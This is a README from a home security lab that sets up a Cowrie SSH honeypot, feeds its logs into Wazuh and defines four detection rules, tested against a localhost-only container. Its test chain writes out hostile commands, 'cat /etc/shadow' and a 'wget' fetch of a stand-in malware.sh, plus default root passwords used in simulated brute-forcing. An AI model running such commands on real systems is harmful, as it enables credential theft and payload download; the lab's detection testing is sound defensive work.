**A sixth real source — this one generates its own hostile traffic instead of relaying real user traffic**

Every other source in this folder wires in traffic from something legitimate (a real Pages site, a real database, a real IDS, a real IdP) that happens to also see occasional attack-shaped noise. This one is different: [Cowrie](https://github.com/cowrie/cowrie) is a real, open-source SSH/Telnet honeypot — it exists purely to be attacked, logs everything an attacker does against it in structured JSON, and has no legitimate traffic to speak of at all.

**What it actually captures**

Cowrie emulates a full fake Linux shell over SSH. An attacker who guesses working credentials believes they've landed a real login, and Cowrie logs every command they run, every file they try to download, and every credential they tried — including the failed ones. `local_rules.xml` here defines four rules on top of Wazuh's built-in JSON decoder (matching Cowrie's own `sensor` field, then branching on its `eventid` field, same overall pattern as the LocalStack rules):

- `100041` — failed login attempt (a credential-stuffing/brute-force signal, tagged T1110)
- `100042` — successful login with a weak/default credential (T1078)
- `100043` — a command executed inside the fake shell (T1059, the highest-severity rule here — an attacker who gets this far is actively hands-on-keyboard)
- `100044` — a file download attempt onto the honeypot (T1105)

**Verified, real — a full attack chain, not a single event**

Real `sshpass`-driven SSH sessions against the running container produced all four alerts for real:

- `root/123456` → real `cowrie.login.failed` → fired `100041`
- `root/toor` → real `cowrie.login.success` → fired `100042`
- Once "in," `cat /etc/shadow; wget http://example.com/malware.sh` → real `cowrie.command.input` → fired `100043` (level 12, the highest level in this whole lab's custom rule set)
- The `wget` inside the fake shell → real `cowrie.session.file_download` → fired `100044`

`sample-alerts.json` is the real, unredacted alert set from that run — no IP redaction was needed here, unlike the other sources, because the source IP is Docker's own bridge gateway address (`172.17.0.1`), not a real external address.

**Honest scope: this is self-generated traffic, not internet-sourced attacks**

Cowrie is bound to `127.0.0.1:2222` on the host — reachable only from this Mac, not the internet. Every alert above came from commands this lab ran against its own honeypot, the same "on-demand test, not passive monitoring" pattern as every other source in this folder. That's a deliberate, safe default: actually exposing SSH-shaped bait to the open internet means real, unpredictable inbound traffic from real scanners and real (if low-skill) attackers hitting a home network, which is a materially different risk decision than anything else in this lab and hasn't been made yet. If that changes, this README gets updated with what real internet-sourced traffic actually looked like — until then, this documents that the detection logic works, not that it's been proven against genuine unsolicited attackers.

**Running it**
```bash
docker run -d --name cowrie-honeypot \
  -p 127.0.0.1:2222:2222 \
  -v ~/securitylab/cowrie-lab/logs:/cowrie/cowrie-git/var/log/cowrie \
  cowrie/cowrie:latest

# generate a test attack chain against your own honeypot
sshpass -p "123456" ssh -o StrictHostKeyChecking=no -p 2222 root@127.0.0.1 "echo test"   # fails
sshpass -p "toor" ssh -o StrictHostKeyChecking=no -p 2222 root@127.0.0.1 "cat /etc/shadow; wget http://example.com/malware.sh"  # succeeds
```
Bind-mount `~/securitylab/cowrie-lab/logs` into the Wazuh manager (`/var/log/cowrie`) the same way as the other sources, add a `<localfile>` stanza with `<log_format>json</log_format>` pointing at `cowrie.json`, and drop `local_rules.xml`'s group block alongside (not replacing) the existing ones.
